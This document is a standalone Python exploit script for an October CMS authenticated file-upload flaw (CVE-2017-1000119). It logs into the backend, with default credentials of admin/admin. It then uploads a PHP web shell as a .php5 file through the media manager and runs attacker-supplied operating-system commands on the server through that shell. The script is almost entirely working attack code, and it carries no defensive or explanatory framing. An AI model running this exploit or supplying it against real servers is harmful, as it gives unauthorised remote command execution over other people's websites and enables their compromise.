#!/usr/bin/python3

# author: dugisan3rd

import argparse
import requests
import re
import sys

proxies = {"http": "http://127.0.0.1:8080"}

def get_token(scheme, rhost, rport):
    url = f"{scheme}://{rhost}:{rport}/backend/backend/auth/signin"
    r = requests.get(url, verify=False)
    # print(r.text)
    token = re.search('<input name="_token" type="hidden" value="(.*?)">', r.text)
    key = re.search('<input name="_session_key" type="hidden" value="(.*?)">', r.text)
    if token and key is not None:
        return token.group(1), key.group(1)
    else:
        print("[+] Token is not found!")
        sys.exit()
    
def login(rhost, rport, scheme, user, password, token, key):
    url = f"{scheme}://{rhost}:{rport}/backend/backend/auth/signin"
    data = {"_session_key": key, "_token": token, "postback": "1", "login": user, "password": password}
    headers = {"Content-Type": "application/x-www-form-urlencoded", "Content-Length": str(len(data) + 2)}
    r = requests.post(url, data=data, headers=headers, verify=False, allow_redirects=False)
    if r.status_code == 302:
        print("[+] Login success!")
        return r.cookies.get_dict()
    else:
        print("[+] Invalid credential!")
        
def upload(scheme, rhost, rport, cookies):
    url = f"{scheme}://{rhost}:{rport}/backend/cms/media"
    filename = "dug.php5"
    f = open(filename, "w+"); f.write("<?php system($_GET['cmd']);?>"); f.close()
    multipart_form_data = {
    'file_data': (filename, open(filename, 'rb')),
    'path': (None, '/')
    }
    headers = {"X-OCTOBER-FILEUPLOAD": "MediaManager-manager"}
    r = requests.post(url, cookies=cookies, headers=headers, verify=False, files=multipart_form_data, allow_redirects=False, proxies=proxies)
    result = re.search(f'{{"link":"\\\/storage\\\/app\\\/media\\\/{filename}","result":"(.*?)"}}', r.text)
    if result.group(1) == "success":
        print("[+] File uploaded!")
        path = re.search('{"link":"(.*?)","result":"success"}', r.text)
        return path.group(1).replace("\\","")
    else:
        print("[+] File upload failed!")  
    
def rce(scheme, rhost, rport, cookies, path, command):
    url = f"{scheme}://{rhost}:{rport}{path}"
    print(f"[+] File URL: {url}")
    r = requests.get(url=url + f"?cmd={command}", cookies=cookies, verify=False, allow_redirects=False)
    if r.status_code == 200:
        return r.text
    else:
        print("[+] File is not found!")
    
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="October CMS File Upload (CVE-2017-1000119)")
    parser.add_argument("--rhost", help="Target IP/Domain")
    parser.add_argument("--rport", help="Target port", type=int, default=80)
    parser.add_argument("--scheme", help="[http|https]", default="http")
    parser.add_argument("-x", "--command", help="Command to execute")
    parser.add_argument("--user", help="Username", default="admin")
    parser.add_argument("--pwd", help="Password", default="admin")
    args = parser.parse_args()
    rhost = args.rhost
    rport = args.rport
    scheme = args.scheme
    command = args.command
    user = args.user
    password = args.pwd
    if len(sys.argv) < 2:
        print("[+] Arguments required! Please use -h for more details.")
    else:
        if scheme and rhost and rport and command and user and password is not None:
            token, key = get_token(scheme, rhost, rport)
            cookies = login(rhost, rport, scheme, user, password, token, key)
            path = upload(scheme, rhost, rport, cookies)
            output = rce(scheme, rhost, rport, cookies, path, command)
            print(f"[+] Output:\n\n{output}")
        else:
            print("[+] Missing arguments!")